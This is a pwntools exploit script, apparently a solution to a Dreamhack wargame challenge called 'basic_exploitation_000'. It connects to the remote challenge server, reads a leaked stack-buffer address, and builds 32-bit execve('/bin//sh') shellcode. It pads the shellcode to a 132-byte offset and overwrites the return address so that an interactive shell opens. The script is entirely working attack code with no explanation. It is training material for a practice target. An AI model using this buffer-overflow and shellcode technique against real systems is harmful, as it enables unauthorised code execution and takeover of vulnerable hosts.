from pwn import *
elf = context.binary = ELF("./basic_exploitation_000")
gs = '''
b main
start
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
#p = start()
p = remote("host8.dreamhack.games", 17746)

line = p.recvline()
print(repr(line))
leak = int(line.strip().split(b'(')[1].split(b')')[0], 16)
log.success(f"buf = {hex(leak)}")
offset = 132

sc = asm('''
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    xor edx, edx
    xor eax, eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    int 0x80
''')

payload = sc + b"A"*(offset - len(sc)) + p32(leak) 
print(f"len(sc) = {len(sc)}")
print(f"len(payload) = {len(payload)}")
p.sendline(payload)
p.interactive()

